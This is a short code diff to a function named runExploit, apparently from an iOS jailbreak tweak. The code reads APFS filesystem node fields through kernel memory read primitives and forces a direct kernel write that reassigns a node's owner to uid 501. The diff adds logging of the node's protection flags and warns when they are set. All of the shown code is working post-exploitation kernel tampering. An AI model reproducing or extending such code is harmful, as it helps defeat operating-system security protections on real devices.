@@ -813,7 +813,14 @@ static void runExploit(void) {
                 if (diag_fs) {
                     uint32_t k_uid = kread32(diag_fs + offsetof(struct apfs_fsnode, uid));
                     uint16_t k_mode = kread16(diag_fs + offsetof(struct apfs_fsnode, mode));
-                    NSLog(@"[Tweak] Kernel fsnode: uid=%u mode=0%o", k_uid, k_mode);
+                    uint32_t k_bsd = kread32(diag_fs + offsetof(struct apfs_fsnode, bsd_flags));
+                    uint32_t k_ino_ext = kread32(diag_fs + offsetof(struct apfs_fsnode, ino_flags_ext));
+                    NSLog(@"[Tweak] Kernel fsnode: uid=%u mode=0%o bsd_flags=0x%x ino_flags_ext=0x%x",
+                          k_uid, k_mode, k_bsd, k_ino_ext);
+                    if ((k_bsd & 0x01) || k_ino_ext != 0) {
+                        NSLog(@"[Tweak] FS node has protection flags! bsd_flags=0x%x ino_flags_ext=0x%x",
+                              k_bsd, k_ino_ext);
+                    }
                     if (k_uid != 501 || (k_mode & 0200) == 0) {
                         NSLog(@"[Tweak] FS node not correctly set! Forcing direct kernel write...");
                         apfs_own_vnode(diag_vnode, 501, 501);
@@ -821,7 +828,10 @@ static void runExploit(void) {
                         // Re-check
                         k_uid = kread32(diag_fs + offsetof(struct apfs_fsnode, uid));
                         k_mode = kread16(diag_fs + offsetof(struct apfs_fsnode, mode));
-                        NSLog(@"[Tweak] After force-write: uid=%u mode=0%o", k_uid, k_mode);
+                        k_bsd = kread32(diag_fs + offsetof(struct apfs_fsnode, bsd_flags));
+                        k_ino_ext = kread32(diag_fs + offsetof(struct apfs_fsnode, ino_flags_ext));
+                        NSLog(@"[Tweak] After force-write: uid=%u mode=0%o bsd_flags=0x%x ino_flags_ext=0x%x",
+                              k_uid, k_mode, k_bsd, k_ino_ext);
                     }
                 }
             }
